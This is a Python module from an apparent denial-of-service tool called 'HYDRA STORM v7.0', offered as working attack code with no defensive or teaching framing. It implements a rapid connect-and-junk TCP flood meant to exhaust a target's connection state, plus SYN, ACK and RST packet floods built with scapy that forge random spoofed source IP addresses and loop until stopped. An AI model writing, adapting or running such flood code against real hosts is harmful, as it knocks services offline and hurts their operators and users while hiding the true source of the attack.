"""
HYDRA STORM v7.0 — TCP Flood Vectors
TCPHammer (pure socket), SYN/ACK/RST floods (scapy if available).
"""

import socket
import random
import threading
import struct
import time
from typing import Any, Optional

# ─── Optional scapy import ───
try:
    from scapy.all import IP, TCP, send, RandShort, conf  # type: ignore
    conf.verb = 0  # shut scapy up
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def _random_ip() -> str:
    """Generate a random spoofed source IP (avoids reserved ranges)."""
    while True:
        octets = [random.randint(1, 254) for _ in range(4)]
        # Skip obviously reserved
        if octets[0] in (0, 10, 127, 224, 225, 226, 227, 228, 229, 230,
                         231, 232, 233, 234, 235, 236, 237, 238, 239, 240,
                         241, 242, 243, 244, 245, 246, 247, 248, 249, 250,
                         251, 252, 253, 254, 255):
            continue
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            continue
        if octets[0] == 192 and octets[1] == 168:
            continue
        return f"{octets[0]}.{octets[1]}.{octets[2]}.{octets[3]}"


# ============================================================
#  TCP Hammer — Rapid Connect / Disconnect
# ============================================================
class TCPHammer:
    """
    Pure-socket TCP flood.
    Rapidly opens connections, optionally sends junk, then hard-shuts them.
    Creates maximum state-table exhaustion on the target.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        send_junk: bool = True,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.send_junk = send_junk
        # Pre-generate some junk payloads
        self._junk = [bytes(random.getrandbits(8) for _ in range(random.randint(64, 512))) for _ in range(50)]

    def fire(self, stop_event: threading.Event) -> None:
        target = (self.target_ip, self.port)

        while not stop_event.is_set():
            sock: Optional[socket.socket] = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(4)
                sock.connect(target)
                self.metrics.conn()

                if self.send_junk:
                    junk = random.choice(self._junk)
                    try:
                        sock.sendall(junk)
                        self.metrics.hit(len(junk))
                    except OSError:
                        pass

            except (ConnectionRefusedError, socket.timeout, OSError):
                self.metrics.err()
            finally:
                if sock:
                    try:
                        sock.shutdown(socket.SHUT_RDWR)
                    except OSError:
                        pass
                    try:
                        sock.close()
                    except OSError:
                        pass


# ============================================================
#  SYN Flood — Spoofed Source IPs (Scapy)
# ============================================================
class SYNFlood:
    """
    Crafts raw SYN packets with randomized spoofed source IPs.
    Each packet looks like a new connection from a different host.
    Falls back to TCPHammer if scapy isn't available.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self._fallback: Optional[TCPHammer] = None

    def fire(self, stop_event: threading.Event) -> None:
        if not SCAPY_AVAILABLE:
            if self._fallback is None:
                self._fallback = TCPHammer(
                    self.target_ip, self.domain, self.port, self.metrics
                )
            self._fallback.fire(stop_event)
            return

        while not stop_event.is_set():
            try:
                src_ip = _random_ip()
                src_port = random.randint(1024, 65535)

                pkt = IP(src=src_ip, dst=self.target_ip) / TCP(
                    sport=src_port,
                    dport=self.port,
                    flags="S",
                    seq=random.randint(0, 0xFFFFFFFF),
                    window=random.choice([8192, 16384, 29200, 32768, 65535]),
                    options=[
                        ("MSS", random.choice([1360, 1380, 1400, 1440, 1460])),
                        ("NOP", None),
                        ("WScale", random.randint(2, 10)),
                        ("NOP", None),
                        ("NOP", None),
                        ("SAckOK", b""),
                    ],
                )
                send(pkt, verbose=0)
                self.metrics.hit(len(pkt))
            except Exception:
                self.metrics.err()
                time.sleep(0.01)


# ============================================================
#  ACK Flood — Scapy-Based
# ============================================================
class ACKFlood:
    """
    Floods with ACK packets carrying spoofed source IPs.
    Causes the target to waste resources looking up non-existent connections.
    Falls back to TCPHammer if scapy isn't available.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self._fallback: Optional[TCPHammer] = None

    def fire(self, stop_event: threading.Event) -> None:
        if not SCAPY_AVAILABLE:
            if self._fallback is None:
                self._fallback = TCPHammer(
                    self.target_ip, self.domain, self.port, self.metrics
                )
            self._fallback.fire(stop_event)
            return

        while not stop_event.is_set():
            try:
                src_ip = _random_ip()
                src_port = random.randint(1024, 65535)

                pkt = IP(src=src_ip, dst=self.target_ip) / TCP(
                    sport=src_port,
                    dport=self.port,
                    flags="A",
                    seq=random.randint(0, 0xFFFFFFFF),
                    ack=random.randint(0, 0xFFFFFFFF),
                    window=random.choice([8192, 16384, 65535]),
                )
                send(pkt, verbose=0)
                self.metrics.hit(len(pkt))
            except Exception:
                self.metrics.err()
                time.sleep(0.01)


# ============================================================
#  RST Flood — Scapy-Based
# ============================================================
class RSTFlood:
    """
    Floods with RST packets.
    Can disrupt existing connections if seq numbers align.
    Falls back to TCPHammer if scapy isn't available.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self._fallback: Optional[TCPHammer] = None

    def fire(self, stop_event: threading.Event) -> None:
        if not SCAPY_AVAILABLE:
            if self._fallback is None:
                self._fallback = TCPHammer(
                    self.target_ip, self.domain, self.port, self.metrics
                )
            self._fallback.fire(stop_event)
            return

        while not stop_event.is_set():
            try:
                src_ip = _random_ip()
                src_port = random.randint(1024, 65535)

                pkt = IP(src=src_ip, dst=self.target_ip) / TCP(
                    sport=src_port,
                    dport=self.port,
                    flags="R",
                    seq=random.randint(0, 0xFFFFFFFF),
                    window=0,
                )
                send(pkt, verbose=0)
                self.metrics.hit(len(pkt))
            except Exception:
                self.metrics.err()
                time.sleep(0.01)
